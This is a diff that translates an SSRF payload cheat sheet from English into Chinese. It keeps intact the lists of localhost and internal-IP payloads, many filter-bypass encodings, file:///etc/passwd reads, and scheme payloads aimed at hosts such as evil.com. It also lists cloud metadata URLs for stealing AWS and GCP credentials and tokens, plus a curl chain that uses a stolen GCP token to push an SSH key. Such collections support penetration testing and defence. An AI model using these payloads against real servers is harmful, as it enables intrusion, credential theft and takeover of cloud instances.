@@ -1,6 +1,6 @@
-# Server-Side Request Forgery
+# 服务端请求伪造-SSRF
 
-> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
+> 服务器端请求伪造-SSRF是一个漏洞，攻击者强制服务器代表它们执行请求。
 
 ## Summary
 
@@ -51,7 +51,7 @@
 - [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
 - [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
 
-## Payloads with localhost
+## 本地Payloads 
 
 Basic SSRF v1
 
@@ -72,32 +72,32 @@ http://localhost:443
 http://localhost:22
 ```
 
-Advanced exploit using a redirection
+使用重定向的高级攻击
 
 ```powershell
-1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
-2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
-vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+1. 使用DNS记录创建一个指向192.168.0.1的子域，例如:ssrf.example.com
+2. 启动SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+vulnerable.com将获取将重定向到192.168.0.1的YOUR_SERVER_IP
 ```
 
-Advanced exploit using type=url
+使用type=url的高级攻击
 
 ```powershell
-Change "type=file" to "type=url"
-Paste URL in text field and hit enter
-Using this vulnerability users can upload images from any image URL = trigger an SSRF
+将“type=file”更改为“type=url”
+在文本框中粘贴URL，然后回车
+使用此漏洞，用户可以从任何图像URL =触发SSRF上传图像
 ```
 
 ## Bypassing filters
 
-### Bypass using HTTPS
+### 使用 HTTPS 绕过
 
 ```powershell
 https://127.0.0.1/
 https://localhost/
 ```
 
-### Bypass localhost with [::]
+### 使用 [::] 绕过本地主机
 
 ```powershell
 http://[::]:80/
@@ -113,7 +113,7 @@ http://0000::1:22/ SSH
 http://0000::1:3128/ Squid
 ```
 
-### Bypass localhost with a domain redirection
+### 使用域名重定向绕过本地主机
 
 ```powershell
 http://spoofed.burpcollaborator.net
@@ -129,7 +129,7 @@ The service nip.io is awesome for that, it will convert any ip address as a dns.
 NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
 ```
 
-### Bypass localhost with CIDR 
+### 使用CIDR绕过本地主机
 
 It's a /8
 
@@ -139,7 +139,7 @@ http://127.0.1.3
 http://127.0.0.0
 ```
 
-### Bypass using a decimal IP location
+### 使用十进制的IP地址绕过
 
 ```powershell
 http://0177.0.0.1/
@@ -148,7 +148,7 @@ http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
 ```
 
-### Bypass using IPv6/IPv4 Address Embedding
+### 绕过使用IPv6/IPv4地址嵌入
 
 [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
 
@@ -156,16 +156,16 @@ http://3232235777/ = http://192.168.1.1
 http://[0:0:0:0:0:ffff:127.0.0.1]
 ```
 
-### Bypass using malformed urls
+### 绕过使用格式错误的url
 
 ```powershell
 localhost:+11211aaa
 localhost:00011211aaaa
 ```
 
-### Bypass using rare address
+### 使稀有地址绕过
 
-You can short-hand IP addresses by dropping the zeros
+您可以通过删除0来缩短IP地址
 
 ```powershell
 http://0/
@@ -173,7 +173,7 @@ http://127.1
 http://127.0.1
 ```
 
-### Bypass using bash variables 
+### 使用bash变量绕过
 
 (curl only)
 
@@ -182,7 +182,7 @@ curl -v "http://evil$google.com"
 $google = ""
 ```
 
-### Bypass using tricks combination
+### 使用技巧相结合的绕过
 
 ```powershell
 http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
@@ -191,7 +191,7 @@ requests + browsers : 2.2.2.2
 urllib : 3.3.3.3
 ```
 
-### Bypass using enclosed alphanumerics 
+### 使用封闭的字母数字绕过
 
 [@EdOverflow](https://twitter.com/EdOverflow)
 
@@ -202,13 +202,13 @@ List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
 
-### Bypass filter_var() php function
+### 绕过filter_var() php函数
 
 ```powershell
 0://evil.com:80;http://google.com:80/ 
 ```
 
-### Bypass against a weak parser
+### 绕过弱解析器
 
 by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
 
@@ -224,9 +224,9 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 
 ## SSRF exploitation via URL Scheme
 
-### File 
+### 文件 
 
-Allows an attacker to fetch the content of a file on the server
+允许攻击者在服务器上获取文件的内容
 
 ```powershell
 file://path/to/file
@@ -237,7 +237,7 @@ ssrf.php?url=file:///etc/passwd
 
 ### HTTP
 
-Allows an attacker to fetch any content from the web, it can also be used to scan ports.
+允许攻击者从web获取任何内容，也可以用来扫描端口
 
 ```powershell
 ssrf.php?url=http://127.0.0.1:22
@@ -247,11 +247,11 @@ ssrf.php?url=http://127.0.0.1:443
 
 ![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)
 
-The following URL scheme can be used to probe the network
+下面的URL方案可用于探测网络
 
 ### Dict
 
-The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+DICT URL模式用于引用使用DICT协议的定义或单词列表:
 
 ```powershell
 dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
@@ -260,7 +260,7 @@ ssrf.php?url=dict://attacker:11111/
 
 ### SFTP 
 
-A network protocol used for secure file transfer over secure shell
+用于通过安全外壳进行安全文件传输的网络协议
 
 ```powershell
 ssrf.php?url=sftp://evil.com:11111/
@@ -268,7 +268,7 @@ ssrf.php?url=sftp://evil.com:11111/
 
 ### TFTP
 
-Trivial File Transfer Protocol, works over UDP
+Trivial File Transfer Protocol. 工作在UDP
 
 ```powershell
 ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
@@ -276,7 +276,7 @@ ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
 
 ### LDAP
 
-Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
+Lightweight Directory Access Protocol. 它是在IP网络上用于管理和访问分布式目录信息服务的应用协议。
 
 ```powershell
 ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
@@ -357,10 +357,10 @@ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brut
 
 ## SSRF URL for Cloud Instances
 
-### SSRF URL for AWS Bucket
+### AWS Bucket 的  SSRF URL
 
 [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
-Interesting path to look for at `http://169.254.169.254`
+这条路径很有意思 `http://169.254.169.254`
 
 ```powershell
 Always here : /latest/meta-data/{hostname,public-ipv4,...}
@@ -368,7 +368,7 @@ User data (startup script for auto-scaling) : /latest/user-data
 Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
 ```
 
-DNS record
+DNS 记录
 
 ```powershell
 http://169.254.169.254
@@ -378,14 +378,14 @@ http://1ynrnhl.xip.io/
 http://www.owasp.org.1ynrnhl.xip.io/
 ```
 
-HTTP redirect
+HTTP 重定向
 
 ```powershell
 Static:http://nicob.net/redir6a
 Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
 ```
 
-Alternate IP encoding
+替换IP编码
 
 ```powershell
 http://425.510.425.510/ Dotted decimal with overflow
@@ -398,7 +398,7 @@ http://0251.0376.0251.0376/ Dotted octal
 http://0251.00376.000251.0000376/ Dotted octal with padding
 ```
 
-More urls to include
+需要包含更多url
 
 ```powershell
 http://169.254.169.254/latest/user-data
@@ -417,21 +417,23 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 http://169.254.169.254/latest/dynamic/instance-identity/document
 ```
 
-E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
+E.g: Jira SSRF 导致AWS信息泄露 -
 
-E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
+ `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
+
+E.g2: Flaws 挑战- `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
 
 
-### SSRF URL for AWS Elastic Beanstalk
+### AWS Elastic Beanstalk 的 SSRF URL
 
-We retrieve the `accountId` and `region` from the API.
+从 API 检索 `accountId` 和`region` 。
 
 ```powershell
 http://169.254.169.254/latest/dynamic/instance-identity/document
 http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
 ```
 
-We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.
+然后从 API 检索 `AccessKeyId`, `SecretAccessKey`和 `Token` 。
 
 ```powershell
 http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
@@ -439,12 +441,12 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbean
 
 ![notsosecureblog-awskey](https://www.notsosecure.com/wp-content/uploads/2019/02/aws-cli.jpg)
 
-Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
+然后使用凭证`aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
 
 
-### SSRF URL for AWS Lambda
+### AWS Lambda 的 SSRF URL
 
-AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.
+AWS Lambda为自定义运行时提供一个HTTP API，用于从Lambda接收调用事件并在Lambda执行环境中发回响应数据。
 
 ```powershell
 http://localhost:9001/2018-06-01/runtime/invocation/next
@@ -453,9 +455,9 @@ $ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
 
 Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next
 
-### SSRF URL for Google Cloud
+### 谷歌云的 SSRF URL
 
-Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
+需要头 "Metadata-Flavor: Google" 或 "X-Google-Metadata-Request: True"
 
 ```powershell
 http://169.254.169.254/computeMetadata/v1/
@@ -466,34 +468,40 @@ http://metadata.google.internal/computeMetadata/v1/instance/id
 http://metadata.google.internal/computeMetadata/v1/project/project-id
 ```
 
-Google allows recursive pulls
+谷歌允许递归提取
 
 ```powershell
 http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
 ```
 
-Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
+测试版不需要报头atm (thanks Mathias Karlsson @avlidienbrunn)
 
 ```powershell
 http://metadata.google.internal/computeMetadata/v1beta1/
 http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
 ```
 
-Interesting files to pull out:
+取出引人注目的文件:
 
-- SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
-- Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
-- Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`
+- SSH 公钥 : 
 
-#### Add an SSH key
+  `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
 
-Extract the token
+- 获取访问令牌 :
+
+   `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
+
+- Kubernetes 键 : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`
+
+#### 添加SSH密钥
+
+提取令牌
 
 ```powershell
 http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
 ```
 
-Check the scope of the token
+查看令牌的范围
 
 ```powershell
 $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
@@ -507,7 +515,7 @@ $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuX
 }
 ```
 
-Now push the SSH key.
+现在按SSH键。
 
 ```powershell
 curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
@@ -518,7 +526,7 @@ curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCo
 
 ### SSRF URL for Digital Ocean
 
-Documentation available at `https://developers.digitalocean.com/documentation/metadata/`
+文档可以在 `https://developers.digitalocean.com/documentation/metadata/`
 
 ```powershell
 curl http://169.254.169.254/metadata/v1/id
@@ -536,17 +544,21 @@ curl http://169.254.169.254/metadata/v1.json | jq
 
 ### SSRF URL for Packetcloud
 
-Documentation available at `https://metadata.packet.net/userdata`
+文档可以在 `https://metadata.packet.net/userdata`
 
 ### SSRF URL for Azure
 
-Limited, maybe more exists? `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`
+有限，也许更多?
+
+`https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`
 
 ```powershell
 http://169.254.169.254/metadata/v1/maintenance
 ```
 
-Update Apr 2017, Azure has more support; requires the header "Metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`
+2017年4月更新，Azure有更多支持;需要标题“Metadata: true”
+
+ `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`
 
 ```powershell
 http://169.254.169.254/metadata/instance?api-version=2017-04-02
@@ -588,7 +600,7 @@ http://100.100.100.200/latest/meta-data/image-id
 
 ### SSRF URL for Kubernetes ETCD
 
-Can contain API keys and internal ip and ports
+可以包含API密钥和内部ip和端口
 
 ```powershell
 curl -L http://127.0.0.1:2379/version
@@ -612,7 +624,7 @@ bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
 curl http://rancher-metadata/<version>/<path>
 ```
 
-More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
+更多信息：https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
 
 
 ## References
